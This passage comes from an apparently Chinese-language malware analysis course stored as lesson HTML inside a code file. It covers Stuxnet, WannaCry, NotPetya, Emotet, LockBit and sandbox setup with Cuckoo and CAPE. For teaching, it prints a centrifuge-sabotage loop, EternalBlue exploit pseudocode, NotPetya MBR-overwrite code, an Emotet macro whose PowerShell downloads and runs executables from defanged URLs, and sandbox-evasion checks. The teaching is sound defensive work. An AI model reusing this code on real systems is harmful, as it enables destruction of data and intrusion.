频率范围匹配铀浓缩离心机\n                is_target = true;\n                break;\n            }\n        }\n    }\n    \n    if (is_target) {\n        // 进入攻击模式\n        inject_malicious_blocks();\n        start_speed_manipulation();\n    }\n}\n\nvoid start_speed_manipulation() {\n    while (true) {\n        // 阶段1：降速攻击\n        for (int i = 0; i < 33; i++) {\n            set_vfd_frequency(i, 1280);  // 从 1410 降到 1280 Hz\n        }\n        sleep(27 * 60);  // 维持 27 分钟\n        \n        // 阶段2：恢复\n        for (int i = 0; i < 33; i++) {\n            set_vfd_frequency(i, 1410);  // 恢复正常\n        }\n        sleep(27 * 60);\n        \n        // 阶段3：极速攻击\n        for (int i = 0; i < 33; i++) {\n            set_vfd_frequency(i, 2);     // 降到 2 Hz（近乎停止）\n        }\n        sleep(27 * 60);\n        \n        // 阶段4：恢复\n        for (int i = 0; i < 33; i++) {\n            set_vfd_frequency(i, 1410);\n        }\n        sleep(27 * 60);\n    }\n    // 同时：向 SCADA 回放录制的正常数据\n    // 操作员完全不知道离心机正在被摧毁\n}</code></pre></div>\n\n<div class=\"callout info\">\n<div class=\"callout-title\">Stuxnet 的遗产</div>\n<p>Stuxnet开创了多个\"第一\"：第一个针对工业控制系统（ICS）的网络武器；第一个使用多个零日漏洞的恶意软件；第一个使用偷取的数字签名的恶意软件。它证明了网络攻击可以造成<strong>物理世界</strong>的破坏。</p>\n</div>\n\n<h3>WannaCry (2017)：勒索软件的全球化</h3>\n\n<p>如果说Stuxnet是精确制导导弹，那WannaCry就是一颗核弹——无差别的全球打击。2017年5月12日，它在数小时内感染了150多个国家的20多万台电脑。</p>\n\n<h4>WannaCry 的技术架构</h4>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">WannaCry 组件分析:\n\n┌─────────────────────────────────────────────┐\n│ mssecsvc.exe (蠕虫组件 - \"Microsoft Security) │\n│                                              │\n│ 功能:                                       │\n│ 1. 利用 EternalBlue (MS17-010) 传播         │\n│ 2. 利用 DoublePulsar 后门安装载荷            │\n│ 3. 扫描随机 IP 和内网 IP 的 445 端口         │\n│ 4. 检查 Kill Switch 域名                     │\n└─────────────────────────────────────────────┘\n         │ 释放\n         ▼\n┌─────────────────────────────────────────────┐\n│ tasksche.exe (勒索组件)                       │\n│                                              │\n│ 功能:                                       │\n│ 1. 生成 2048-bit RSA 密钥对                  │\n│ 2. 用公钥加密 AES 文件密钥                   │\n│ 3. 加密 177 种文件类型                       │\n│ 4. 显示勒索界面                              │\n│ 5. 设置桌面壁纸为勒索信                       │\n│ 6. 创建 @Please_Read_Me@.txt                 │\n└─────────────────────────────────────────────┘\n\n加密流程:\n  每个文件:\n    1. 生成随机 128-bit AES 密钥\n    2. AES-128-CBC 加密文件内容\n    3. 用嵌入的 RSA-2048 公钥加密 AES 密钥\n    4. 写入 \"WANACRY!\" 魔数 + 加密的 AES 密钥 + 密文\n    \n  文件头格式:\n  ┌──────────┬────────────┬───────────┬──────────────┐\n  │ WANACRY! │ RSA 密钥长 │ 加密的AES │ 加密的文件内容 │\n  │ (8字节)  │ (4字节)    │ (256字节) │ (变长)         │\n  └──────────┴────────────┴───────────┴──────────────┘</code></pre></div>\n\n<h4>WannaCry 的传播机制分析</h4>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\"># WannaCry EternalBlue 利用流程分析（Python 伪代码）\n# 仅供学习理解，不可用于实际攻击\n\nclass EternalBlueExploit:\n    \"\"\"\n    EternalBlue (MS17-010) 利用流程\n    目标: Windows SMBv1 服务\n    \"\"\"\n    \n    def exploit(self, target_ip):\n        # 阶段 1: SMB 协商\n        self.smb_negotiate(target_ip)\n        \n        # 阶段 2: 发送精心构造的 SMB 事务请求\n        # 利用 srvnet.sys 中的整数溢出\n        trans_request = self.craft_malicious_trans(\n            # 通过超大的 DataCount 触发整数溢出\n            data_count=0xFFFFFFFF,  \n            # 导致分配小缓冲区\n            # 后续写入数据时发生堆溢出\n        )\n        self.send_smb(trans_request)\n        \n        # 阶段 3: 堆溢出覆盖 srvnet 连接对象\n        # 将函数指针替换为 shellcode 地址\n        self.trigger_overflow()\n        \n        # 阶段 4: 触发 shellcode 执行\n        # Shellcode 通过 DoublePulsar 后门加载 WannaCry\n        self.execute_shellcode(\n            payload=\"mssecsvc.exe\"  # WannaCry 蠕虫组件\n        )\n        \n        return True  # 目标已被感染\n\n# 传播策略:\ndef spreading_strategy():\n    \"\"\"WannaCry 的 IP 扫描策略\"\"\"\n    # 1. 本地子网扫描\n    scan_local_subnet(port=445)\n    \n    # 2. 随机公网 IP 生成\n    #    但有权重偏向：\n    #    - 70% 同 /16 网段\n    #    - 20% 同 /8 网段\n    #    - 10% 完全随机\n    for _ in range(128):  # 每个线程扫描 128 个 IP\n        ip = generate_weighted_random_ip()\n        if check_port(ip, 445):\n            EternalBlueExploit().exploit(ip)</code></pre></div>\n\n<div class=\"callout success\">\n<div class=\"callout-title\">WannaCry 的教训</div>\n<p>WannaCry证明了一个重要事实：<strong>未及时修补的漏洞</strong>是最大的安全风险。MS17-010补丁在WannaCry爆发前<strong>两个月</strong>就已发布。此外，NSA开发的网络武器（EternalBlue）被泄露后用于民用攻击，引发了关于网络武器储备的广泛讨论。</p>\n</div>\n\n<h3>NotPetya (2017)：伪装成勒索软件的破坏武器</h3>\n\n<p>WannaCry之后仅仅6周，NotPetya出现了。表面上它是勒索软件，但实际上它是一个<strong>破坏性武器</strong>——它的真正目的是摧毁数据，而非勒索钱财。</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">NotPetya vs WannaCry 对比:\n\n特征           │ WannaCry              │ NotPetya\n───────────────┼───────────────────────┼──────────────────────\n目的           │ 勒索金钱              │ 数据破坏（伪装勒索）\n初始载体       │ EternalBlue 漏洞      │ MeDoc 供应链污染\n传播方式       │ SMB 漏洞              │ SMB + Mimikatz + PsExec\n加密算法       │ AES-128 + RSA-2048   │ 自定义 Salsa20 + RSA\n可解密         │ 部分可（私钥未泄露但   │ 不可（故意设计为不可恢复）\n               │ 可通过漏洞恢复）       │\nMBR 修改       │ 无                    │ 覆盖 MBR，伪装 CHKDSK\n横向移动       │ 仅 EternalBlue        │ EternalBlue + 凭证窃取\nKill Switch    │ 有（域名检查）         │ 无\n影响           │ 全球 20万+            │ 主要乌克兰，全球扩散\n经济损失       │ ~$8B                  │ ~$10B（史上最高）</code></pre></div>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-c\">// NotPetya 的 MBR 覆写逻辑（反编译）\n// 这才是它的真正意图——不是加密，而是破坏\n\nvoid overwrite_mbr() {\n    HANDLE hDisk = CreateFileA(\n        \"\\\\\\\\.\\\\PhysicalDrive0\",    // 直接访问物理磁盘\n        GENERIC_READ | GENERIC_WRITE,\n        FILE_SHARE_READ | FILE_SHARE_WRITE,\n        NULL, OPEN_EXISTING, 0, NULL\n    );\n    \n    // 读取原始 MBR（512 字节）\n    BYTE original_mbr[512];\n    ReadFile(hDisk, original_mbr, 512, NULL, NULL);\n    \n    // 用假 MBR 替换（显示 \" CHKDSK \" 假象）\n    BYTE fake_mbr[512];\n    memcpy(fake_mbr, fake_mbr_template, 512);\n    \n    // 保存原始分区表到假 MBR 的特定位置\n    // （让受害者以为数据还能恢复）\n    memcpy(fake_mbr + 0x1BE, original_mbr + 0x1BE, 64);\n    \n    // 写入假 MBR\n    SetFilePointer(hDisk, 0, NULL, FILE_BEGIN);\n    WriteFile(hDisk, fake_mbr, 512, NULL, NULL);\n    \n    // 重启电脑 → 显示假的 CHKDSK 界面\n    // 实际上数据已经被加密/破坏，无法恢复\n    ExitWindowsEx(EWX_REBOOT, 0);\n}</code></pre></div>\n\n<div class=\"checkpoint\" data-cp=\"8\"></div>\n\n<h3>Emotet (2014-2021)：恶意软件之王</h3>\n\n<p>Emotet最初是一个银行木马，但后来演变成了一个<strong>恶意软件即服务</strong>（Malware-as-a-Service）平台。它的运营者向其他犯罪分子出租Emotet的僵尸网络，用于分发其他恶意软件。</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">Emotet 生态系统和商业模式:\n\nEmotet (基础设施层)\n├── 僵尸网络: 全球 100万+ 受感染设备\n├── C2 架构: 分层，每层 10-20 个 C2 服务器\n├── 传播: 钓鱼邮件（每天 10万+ 封）\n│\n├── 客户 1: TrickBot (银行木马)\n│   └── 窃取银行凭证、加密货币钱包\n│\n├── 客户 2: Ryuk (勒索软件)  \n│   └── 针对大型企业，赎金 $100K-$5M\n│\n├── 客户 3: QakBot (信息窃取)\n│   └── 键盘记录、浏览器凭证窃取\n│\n└── 客户 4: Cobalt Strike (渗透工具)\n    └── 用于进一步的横向移动和持久化\n\nEmotet 的技术演进:\n2014: 基础银行木马，表单抓取\n2015: 增加邮件窃取功能（用于钓鱼列表）\n2016: 增加模块化架构，支持插件\n2017: 成为分发平台\n2018: 增加 WiFi 蠕虫功能（自动扫描附近WiFi）\n2019: 增加 Outlook 邮件劫持（用真实邮件转发钓鱼）\n2020: 增加 EternalBlue 横向传播\n2021年1月: 国际执法行动 (Operation Ladybird) 捣毁基础设施\n2022年: 重新出现，使用新的基础设施</code></pre></div>\n\n<h4>Emotet 的混淆技术分析</h4>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">Emotet 的 Excel 宏（去混淆后）:\n\n' 原始宏使用了多层混淆:\n' 1. 字符串拆分: \"pow\" & \"ershe\" & \"ll\"\n' 2. 变量名混淆: xKz3Qw = 函数名\n' 3. 编码: Chr(112) & Chr(111) & Chr(119) = \"pow\"\n\n' 去混淆后的核心逻辑:\nSub AutoOpen()\n    Dim shell As Object\n    Set shell = CreateObject(\"WScript.Shell\")\n    \n    ' 构建 PowerShell 命令\n    Dim cmd As String\n    cmd = \"powershell -w hidden -nop -ep bypass \"\n    cmd = cmd + \"-enc \" + encoded_payload\n    \n    ' 执行下载器\n    shell.Run cmd, 0, False\nEnd Sub\n\n' PowerShell 载荷 (Base64 解码后):\n$urls = @(\n    \"hxxp://legit-hijacked-site1[.]com/wp-content/b1.exe\",\n    \"hxxp://legit-hijacked-site2[.]com/images/c2.exe\",\n    \"hxxp://legit-hijacked-site3[.]com/js/d3.exe\",\n    \"hxxp://legit-hijacked-site4[.]com/css/e4.exe\",\n    \"hxxp://legit-hijacked-site5[.]com/lib/f5.exe\"\n)\n$out = \"$env:TEMP\\svc\" + (Get-Random) + \".exe\"\nforeach ($u in $urls) {\n    try {\n        (New-Object Net.WebClient).DownloadFile($u, $out)\n        if (Test-Path $out) {\n            Start-Process $out\n            break\n        }\n    } catch {}\n}\n\nEmotet 持久化机制:\n  注册表: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n  服务:   创建伪装为系统服务的持久化服务\n  计划任务: \\Microsoft\\Windows\\[随机名]</code></pre></div>\n\n<h3>现代威胁格局 (2022-2024)</h3>\n\n<h4>LockBit 3.0：勒索软件即服务的巅峰</h4>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">LockBit 3.0 (LockBit Black) 运营模式:\n\n核心团队 (~10-15 人)\n├── 开发: 维护勒索软件核心代码\n├── 运维: 管理 C2 基础设施和数据泄露站点\n└── 谈判: 与受害者沟通赎金\n\n附属成员 (Affiliates, 100+ 人)\n├── 获取初始访问权限 (购买 RDP 凭证、利用漏洞)\n├── 横向移动 (使用 Cobalt Strike、Mimikatz)\n├── 数据窃取 (使用 Rclone 上传到云存储)\n└── 部署勒索软件 (使用 GPO 批量推送)\n\n收益分成:\n  附属成员: 70-80%\n  核心团队: 20-30%\n\n2022-2023 年收入估计: $91M+\n受害组织: 2000+ (包括医院、政府、学校)\n\nLockBit 3.0 技术特点:\n  - 用 C 编写，极快的加密速度\n  - 支持安全模式启动（绕过安全软件）\n  - 使用组策略 (GPO) 在域内批量部署\n  - 内置数据窃取工具\n  - 双重勒索: 加密 + 威胁公开数据</code></pre></div>\n\n<h4>供应链攻击的新趋势</h4>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">近年重大供应链攻击:\n\n1. SolarWinds/SUNBURST (2020)\n   攻击者: APT29 (Cozy Bear, 俄罗斯)\n   方式: 入侵构建系统，污染 Orion 更新\n   影响: 18,000+ 组织\n\n2. Kaseya VSA (2021)\n   攻击者: REvil (俄罗斯勒索组织)\n   方式: 利用 MSP 工具漏洞\n   影响: 1,500+ 企业（通过 MSP 间接受影响）\n\n3. MOVEit Transfer (2023)\n   攻击者: Cl0p (勒索组织)\n   方式: SQL 注入 → 数据窃取\n   影响: 2,600+ 组织, 6200万+ 个人数据\n\n4. XZ Utils 后门 (2024, 未遂)\n   攻击者: 未知（潜伏 3 年的社会工程）\n   方式: 维护者逐步获取信任，植入 SSH 后门\n   影响: 几乎进入所有 Linux 发行版（被及时发现）\n\n共同特征:\n  ✓ 攻击者具有极高的耐心和资源\n  ✓ 利用信任关系（软件供应商、开源社区）\n  ✓ 影响范围广，检测困难\n  ✓ 传统边界防御无法阻止</code></pre></div>\n\n<div class=\"callout warn\">\n<div class=\"callout-title\">防御启示</div>\n<p>从Stuxnet到MOVEit，我们看到的趋势是：恶意软件越来越复杂，攻击面越来越广，防御越来越困难。作为安全分析师，你需要建立<strong>纵深防御</strong>思维——不信任任何单一防线，而是层层设防。同时，YARA规则、行为分析、威胁情报共享是应对这些威胁的关键工具。</p>\n</div>\n\n<div class=\"checkpoint\" data-cp=\"9\"></div>\n\n<h3>小结</h3>\n\n<p>通过分析这些里程碑式的恶意软件，你看到了恶意软件的进化路径：</p>\n<ul>\n<li><strong>Stuxnet</strong>：开创了网络武器的先河，证明了代码可以造成物理破坏</li>\n<li><strong>WannaCry</strong>：展示了漏洞利用+勒索的商业化模式，以及补丁管理的重要性</li>\n<li><strong>NotPetya</strong>：伪装勒索软件的国家级破坏武器，揭示了\"假旗\"攻击策略</li>\n<li><strong>Emotet</strong>：恶意软件即服务的商业模式，模块化架构的威力</li>\n<li><strong>现代威胁</strong>：供应链攻击、双重勒索、AI辅助攻击的新趋势</li>\n</ul>\n\n<p>下一节，我们将学习如何用<strong>沙箱</strong>来自动化分析这些恶意软件——让机器替你做那些重复性的工作。</p>";
+
+SECTION_CONTENT["malw-04-01"] = "<h2>沙箱分析平台实战：让自动化替你干活</h2>\n\n<p>想象这个场景：你的安全运营中心（SOC）每天收到200个可疑文件。手动分析每一个？不可能。你需要一个<strong>自动化分析系统</strong>——它能自动运行可疑样本、记录所有行为、生成结构化报告，让你把精力集中在真正需要人工分析的高危样本上。</p>\n\n<p>这就是沙箱的价值。在这一节中，你将学会搭建和使用专业的恶意软件分析沙箱，并理解如何将沙箱集成到你的安全工作流中。</p>\n\n<h3>沙箱原理：安全隔离的分析环境</h3>\n\n<p>沙箱本质上是一个<strong>受控的虚拟环境</strong>，恶意软件在其中运行，而沙箱在外部监控它的一切行为：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">沙箱分析架构:\n\n┌─────────────────────────────────────────────────────────┐\n│                    沙箱控制主机                            │\n│                                                         │\n│  ┌──────────────┐  ┌──────────────┐  ┌───────────────┐ │\n│  │ 任务调度器    │  │ 报告生成器    │  │ 威胁情报接口   │ │\n│  │ - 接收样本    │  │ - 行为汇总    │  │ - IOC 提取     │ │\n│  │ - 分配 VM    │  │ - 风险评分    │  │ - YARA 匹配    │ │\n│  │ - 启动分析    │  │ - PDF/HTML   │  │ - STIX/TAXII   │ │\n│  └──────┬───────┘  └──────┬───────┘  └───────┬───────┘ │\n│         │                  │                   │         │\n│  ┌──────┴──────────────────┴───────────────────┴───────┐│\n│  │              虚拟化层 (VirtualBox / KVM)             ││\n│  │                                                     ││\n│  │  ┌─────────────┐  ┌─────────────┐  ┌────────────┐  ││\n│  │  │ Win10 分析VM │  │ Win7 分析VM  │  │ Linux 分析VM│  ││\n│  │  │             │  │             │  │            │  ││\n│  │  │ 监控代理     │  │ 监控代理     │  │ 监控代理    │  ││\n│  │  │ - API Hook  │  │ - API Hook  │  │ - strace   │  ││\n│  │  │ - 进程注入  │  │ - 进程注入  │  │ - 系统调用  │  ││\n│  │  │ - 网络嗅探  │  │ - 网络嗅探  │  │ - 网络嗅探  │  ││\n│  │  │ - 文件监控  │  │ - 文件监控  │  │ - 文件监控  │  ││\n│  │  └─────────────┘  └─────────────┘  └────────────┘  ││\n│  └─────────────────────────────────────────────────────┘│\n│                                                         │\n│  ┌──────────────────────────────────────────────────┐   │\n│  │              网络模拟层                            │   │\n│  │  INetSim / FakeNet-NG                            │   │\n│  │  - 模拟 HTTP/HTTPS/DNS/SMTP/FTP 服务器           │   │\n│  │  - 捕获所有出站连接请求                           │   │\n│  │  - 返回可配置的模拟响应                           │   │\n│  └──────────────────────────────────────────────────┘   │\n└─────────────────────────────────────────────────────────┘</code></pre></div>\n\n<h3>Cuckoo Sandbox 3：开源沙箱实战</h3>\n\n<p>Cuckoo Sandbox是最流行的开源恶意软件分析沙箱。让我们从零开始搭建一个：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># ====================================================\n# Cuckoo Sandbox 3 搭建指南\n# 环境: Ubuntu 22.04 LTS (主机) + Windows 10 (分析VM)\n# ====================================================\n\n# 第一步：安装依赖\nsudo apt update && sudo apt install -y \\\n    python3 python3-pip python3-venv python3-dev \\\n    libffi-dev libssl-dev libcap2-dev \\\n    tcpdump apparmor-utils \\\n    virtualbox virtualbox-ext-pack virtualbox-guest-additions-iso\n\n# 第二步：安装 Cuckoo 3\npython3 -m venv /opt/cuckoo3\nsource /opt/cuckoo3/bin/activate\npip install cuckoo3\n\n# 第三步：创建分析虚拟机\n# 1. 在 VirtualBox 中创建 Windows 10 VM\n#    - 名称: win10-analysis\n#    - 内存: 4096 MB\n#    - 硬盘: 60 GB (动态分配)\n#    - 网络: 仅主机 (Host-Only, vboxnet0)\n\n# 2. 在 VM 中安装 Python 3 和 Cuckoo Agent\npip install cuckoo3-agent\n\n# 3. 安装分析所需的工具到 VM 中:\n#    - Sysinternals 工具包\n#    - Process Monitor\n#    - Wireshark\n#    - 7-Zip\n#    - Adobe Reader (用于 PDF 分析)\n#    - Microsoft Office (用于文档宏分析)\n\n# 4. 拍摄干净快照\n#    在 VirtualBox 中: 快照 → 拍摄 → \"clean-snapshot\"\n\n# 第四步：配置 Cuckoo\n# 编辑 ~/.cuckoo3/conf/cuckoo.conf\ncat > ~/.cuckoo3/conf/cuckoo.conf << 'CONF'\n[cuckoo]\nmachinery = virtualbox\nmax_analysis_count = 100\nanalysis_timeout = 300\n\n[resultserver]\nip = 192.168.56.1\nport = 2042\n\n[virtualbox]\ninterface = vboxnet0\n\n[win10-analysis]\nip = 192.168.56.101\nsnapshot = clean-snapshot\nplatform = windows\nresultserver_ip = 192.168.56.1\nresultserver_port = 2042\nCONF\n\n# 第五步：配置网络\n# 创建 Host-Only 网络并配置\nsudo VBoxManage hostonlyif create\nsudo VBoxManage hostonlyif ipconfig vboxnet0 --ip 192.168.56.1\n\n# 启用 IP 转发（让 VM 能访问外部网络，按需开启）\nsudo sysctl -w net.ipv4.ip_forward=1\nsudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE\n\n# 第六步：启动 Cuckoo\ncuckoo --cwd ~/.cuckoo3\n# 在另一个终端启动 Web 界面:\ncuckoo web runserver 0.0.0.0:8080</code></pre></div>\n\n<h4>提交样本并分析</h4>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 提交样本进行分析\ncuckoo submit /path/to/suspicious_sample.exe\n\n# 提交 URL 分析\ncuckoo submit --url \"http://suspicious-domain.com/payload.exe\"\n\n# 指定分析选项\ncuckoo submit /path/to/sample.exe \\\n    --machine win10-analysis \\\n    --timeout 300 \\\n    --options \"procmemdump=yes,enforce_timeout=yes\"\n\n# 使用 API 提交（用于自动化集成）\ncurl -X POST http://localhost:8080/api/tasks/create/file \\\n    -F \"file=@/path/to/sample.exe\" \\\n    -F \"machine=win10-analysis\" \\\n    -F \"timeout=300\"\n\n# 查询分析结果\ncurl http://localhost:8080/api/tasks/view/1 | python3 -m json.tool</code></pre></div>\n\n<h3>解读沙箱报告：从数据到情报</h3>\n\n<p>沙箱生成的报告是大量的结构化数据。你需要知道<strong>看什么</strong>和<strong>如何解读</strong>：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">Cuckoo Sandbox 分析报告解读指南:\n\n═══════════════════════════════════════════════\n  摘要信息 (Summary)\n═══════════════════════════════════════════════\n  文件名: invoice_2024.exe\n  MD5:    a1b2c3d4e5f6...\n  类型:   PE32 executable (GUI) Intel 80386\n  大小:   425,984 bytes\n  YARA:   匹配 Emotet_Dropper, Generic_Ransomware\n  评分:   9.8 / 10 (极度危险)  ← 评分基于行为严重程度\n\n═══════════════════════════════════════════════\n  行为分析 (Behavior)\n═══════════════════════════════════════════════\n\n进程树:\n  invoice_2024.exe (PID: 2340)\n  ├── cmd.exe (PID: 2891)\n  │   └── powershell.exe (PID: 3102)    ← 可疑！\n  │       └── rundll32.exe (PID: 3455)  ← 进程注入！\n  │           └── svchost.exe (PID: 3678) ← 伪装系统进程\n  └── schtasks.exe (PID: 2900)           ← 创建计划任务\n\n重点关注的行为指标:\n  ✗ 进程注入 (CreateRemoteThread → svchost.exe)\n  ✗ 代码注入 (WriteProcessMemory)\n  ✗ 文件删除 (self-delete 技术)\n  ✗ 注册表持久化 (Run 键)\n  ✗ 网络连接 (多个 C2 服务器)\n  ✗ 文件加密行为 (CryptEncrypt 调用)\n\n═══════════════════════════════════════════════\n  网络活动 (Network)\n═══════════════════════════════════════════════\n\nDNS 查询:\n  cdn-update.windows-live[.]com → 185.234.xx.xx\n  api.telemetry-service[.]net → 91.108.xx.xx\n\nHTTP 请求:\n  GET /gate.php HTTP/1.1\n  Host: cdn-update.windows-live[.]com\n  \n  POST /upload HTTP/1.1\n  Host: api.telemetry-service[.]net\n  Content-Type: multipart/form-data  ← 数据窃取！\n\n提取的 IOC (Indicators of Compromise):\n  域名: cdn-update.windows-live[.]com\n  域名: api.telemetry-service[.]net\n  IP:   185.234.xx.xx\n  IP:   91.108.xx.xx\n  URL:  hxxp://cdn-update.windows-live[.]com/gate.php\n  文件: %APPDATA%\\Microsoft\\svchost.exe\n\n═══════════════════════════════════════════════\n  提取的工件 (Artifacts)\n═══════════════════════════════════════════════\n  内存转储: svchost.exe (PID 3678) → 包含未加密的 C2 配置\n  PCAP 文件: 完整的网络流量捕获\n  截图:      执行过程中的桌面截图\n  删除文件:  被样本删除的临时文件（已恢复）</code></pre></div>\n\n<h3>CAPE Sandbox：针对高级威胁的增强沙箱</h3>\n\n<p>Cuckoo是很好的起点，但面对现代恶意软件的反沙箱技术，你可能需要更强大的工具。<strong>CAPE Sandbox</strong>（Cuckoo的社区分支）增加了许多高级功能：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># CAPE Sandbox 安装（基于 Cuckoo，增加功能）\ngit clone https://github.com/kevoreilly/CAPEv2.git\ncd CAPEv2\nsudo python3 utils/community.py -waf\n\n# CAPE 的独特能力:\n\n# 1. 自动载荷提取\n# CAPE 能自动从加壳/加密样本中提取内嵌的恶意载荷\n# 例如：从 Emotet 的 dropper 中提取第二阶段载荷\n\n# 2. 反反沙箱\n# 自动绕过恶意软件的沙箱检测:\n# - 模拟用户活动（鼠标移动、键盘输入）\n# - 修改系统属性（CPU核数、内存大小、磁盘大小）\n# - 禁用已知的反沙箱检查点\n\n# 3. 多阶段分析\n# 自动分析多阶段恶意软件:\n# 阶段1: Dropper → 自动提取 → 阶段2: Loader → 自动提取 → 阶段3: Payload\n\n# 4. 内存分析集成\n# 自动运行 Volatility 分析内存转储:\ncape submit --options \"procdump=1,virustotal=1\" sample.exe</code></pre></div>\n\n<h3>对抗沙箱逃避技术</h3>\n\n<p>聪明的恶意软件会检测自己是否在沙箱中运行。你需要了解这些技术，才能更好地配置你的沙箱：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">\"\"\"\n常见沙箱检测技术及应对方案\n\"\"\"\n\n# ─── 恶意软件的沙箱检测方法 ───\n\nsandbox_checks = {\n    \"硬件指纹\": {\n        \"描述\": \"检查CPU核数、内存、磁盘大小\",\n        \"代码\": \"\"\"\n        import wmi\n        c = wmi.WMI()\n        for cpu in c.Win32_Processor():\n            if cpu.NumberOfCores < 2:\n                print(\"沙箱！只有\", cpu.NumberOfCores, \"核\")\n                exit()\n        \"\"\",\n        \"应对\": \"VM 配置至少 2 核 CPU、4GB 内存、80GB 磁盘\"\n    },\n    \n    \"用户名/计算机名\": {\n        \"描述\": \"检查是否为沙箱默认名称\",\n        \"代码\": \"\"\"\n        import getpass, socket\n        user = getpass.getuser()\n        hostname = socket.gethostname()\n        sandbox_names = [\"john-pc\", \"user\", \"sandbox\", \"test\",\n                        \"cuckoo\", \"maltest\", \"virus\"]\n        if user.lower() in sandbox_names or \\\n           hostname.lower() in sandbox_names:\n            exit()  # 检测到沙箱！\n        \"\"\",\n        \"应对\": \"使用真实感的用户名和计算机名\"\n    },\n    \n    \"运行时间检测\": {\n        \"描述\": \"沙箱通常分析时间短（3-5分钟）\",\n        \"代码\": \"\"\"\n        import time\n        # 休眠 10 分钟，如果沙箱超时则不会被执行\n        time.sleep(600)  # 很多沙箱默认 300 秒超时\n        \n        # 或者检查系统运行时间\n        import ctypes\n        uptime = ctypes.windll.kernel32.GetTickCount64()\n        if uptime < 10 * 60 * 1000:  # 运行不到10分钟\n            exit()  # 刚启动的VM，可能是沙箱\n        \"\"\",\n        \"应对\": \"增加超时时间；启动VM后等待一段时间再分析\"\n    },\n    \n    \"进程/文件检测\": {\n        \"描述\": \"查找沙箱相关的进程或文件\",\n        \"代码\": \"\"\"\n        import subprocess\n        procs = subprocess.check_output(\"tasklist\").decode()\n        sandbox_procs = [\"python\", \"cuckoo\", \"vmtoolsd\",\n                        \"VBoxService\", \"wireshark\", \"procmon\"]\n        for proc in sandbox_procs:\n            if proc.lower() in procs.lower():\n                exit()  # 检测到沙箱工具！\n        \"\"\",\n        \"应对\": \"隐藏沙箱工具进程名；使用无代理监控\"\n    },\n    \n    \"鼠标/键盘活动\": {\n        \"描述\": \"检查是否有真实的用户交互\",\n        \"代码\": \"\"\"\n        import ctypes\n        user32 = ctypes.windll.user32\n        # 检查鼠标是否移动过\n        pos1 = ctypes.wintypes.POINT()\n        user32.GetCursorPos(ctypes.byref(pos1))\n        time.sleep(5)\n        pos2 = ctypes.wintypes.POINT()\n        user32.GetCursorPos(ctypes.byref(pos2))\n        if pos1.x == pos2.x and pos1.y == pos2.y:\n            exit()  # 鼠标没动过，可能是沙箱\n        \"\"\",\n        \"应对\": \"沙箱配置中启用模拟用户活动\"\n    }\n}\n\n# ─── 构建反反沙箱配置 ───\n\ndef harden_sandbox():\n    \"\"\"加固沙箱环境以对抗检测\"\"\"\n    config = {\n        \"vm\": {\n            \"cpu_cores\": 4,\n            \"ram_gb\": 8,\n            \"disk_gb\": 100,\n            \"hostname\": \"DESKTOP-JK2M4N7\",  # 真实感的名称\n            \"username\": \"jchen\",              # 真实感的用户名\n            \"recent_files\": True,             # 放置一些\"使用过\"的文件\n        },\n        \"analysis\": {\n            \"timeout\": 600,         # 10分钟超时\n            \"simulate_input\": True, # 模拟鼠标和键盘\n            \"boot_delay\": 120,      # 启动后等待2分钟\n        },\n        \"network\": {\n            \"fake_services\": True,  # 模拟真实网络服务\n            \"ssl_intercept\": True,  # 解密 HTTPS 流量\n        }\n    }\n    return config</code></pre></div>\n\n<div class=\"callout info\">\n<div class=\"callout-title\">进阶技巧</div>\n<p>对于高度对抗性的样本，考虑使用<strong>\"裸金属\"分析</strong>——在物理机器（而非虚拟机）上运行样本。这完全避免了VM检测问题，但需要更复杂的环境恢复机制（如使用Intel AMT远程重装系统）。</p>\n</div>\n\n<h3>自动化分析工作流</h3>\n\n<p>将沙箱集成到你的安全运营工作流中，实现从样本接收到威胁情报的全自动化：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">#!/usr/bin/env python3\n\"\"\"\n自动化恶意软件分析工作流\n整合沙箱、YARA、威胁情报平台\n\"\"\"\n\nimport requests\nimport json\nimport time\nfrom pathlib import Path\n\nclass AutomatedAnalysisPipeline:\n    def __init__(self, sandbox_url, yara_rules_dir):\n        self.sandbox_url = sandbox_url\n        self.yara_rules_dir = Path(yara_rules_dir)\n        self.api_key = \"YOUR_API_KEY\"\n    \n    def submit_sample(self, filepath):\n        \"\"\"步骤1: 提交样本到沙箱\"\"\"\n        with open(filepath, 'rb') as f:\n            response = requests.post(\n                f\"{self.sandbox_url}/api/tasks/create/file\",\n                files={\"file\": f},\n                data={\n                    \"machine\": \"win10-analysis\",\n                    \"timeout\": 300,\n                    \"options\": \"procdump=1,enforce_timeout=1\"\n                }\n            )\n        task_id = response.json()[\"task_id\"]\n        print(f\"[+] 已提交样本，任务ID: {task_id}\")\n        return task_id\n    \n    def wait_for_completion(self, task_id, timeout=600):\n        \"\"\"步骤2: 等待分析完成\"\"\"\n        start = time.time()\n        while time.time() - start < timeout:\n            status = requests.get(\n                f\"{self.sandbox_url}/api/tasks/view/{task_id}\"\n            ).json()[\"task\"][\"status\"]\n            \n            if status == \"reported\":\n                print(f\"[+] 分析完成！\")\n                return True\n            elif status == \"failed\":\n                print(f\"[-] 分析失败\")\n                return False\n            \n            time.sleep(10)\n        return False\n    \n    def extract_iocs(self, task_id):\n        